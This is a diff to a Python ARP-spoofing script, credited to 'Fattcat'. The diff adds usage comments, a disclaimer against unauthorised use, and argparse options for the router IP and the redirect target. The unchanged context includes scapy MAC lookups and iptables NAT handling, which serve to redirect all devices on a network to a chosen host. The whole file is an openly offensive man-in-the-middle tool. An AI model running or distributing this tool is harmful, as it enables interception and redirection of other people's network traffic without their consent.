@@ -1,9 +1,26 @@
 #!/usr/bin/env python3
 
+
+# --------------------
+# created by Fattcat -
+#     ARP Attack     -
+# --------------------
+
+# USAGE : python3 script.py -rt 192.168.1.123 -r_ip 192.168.1.1
+
+# "-r_ip" or "--router_ip" for set IP address of WiFi Router.
+# "-rt" or "--redirect_to" for set IP address on which will be all devices redirected.
+
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+# !! DONT USE THIS CODE FOR BAD IDEAS OR HACKING WITHOUT PERMISSION BY OWNER OF ROUTER !!
+# !! ONLY U ARE RESPONSIBLE FOR ALL DAMAGES THAT HAVE BEEN MADE BY BAD USING THIS CODE !!
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
 import scapy.all as scapy
 import subprocess
 import sys
 import time
+import argparse
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -47,12 +64,13 @@ def clear_iptables():
     subprocess.call(["iptables", "-t", "nat", "-F"])
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python3 script.py <redirect_ip> <gateway_ip>")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
+    parser.add_argument("-r_ip", "--router_ip", required=True, help="IP address of the router (gateway)")
+    parser.add_argument("-rt", "--redirect_to", required=True, help="IP address to redirect the traffic to")
 
-    redirect_ip = sys.argv[1]
-    gateway_ip = sys.argv[2]
+    args = parser.parse_args()
+    gateway_ip = args.router_ip
+    redirect_ip = args.redirect_to
 
     try:
         print("[*] Setting up iptables...")
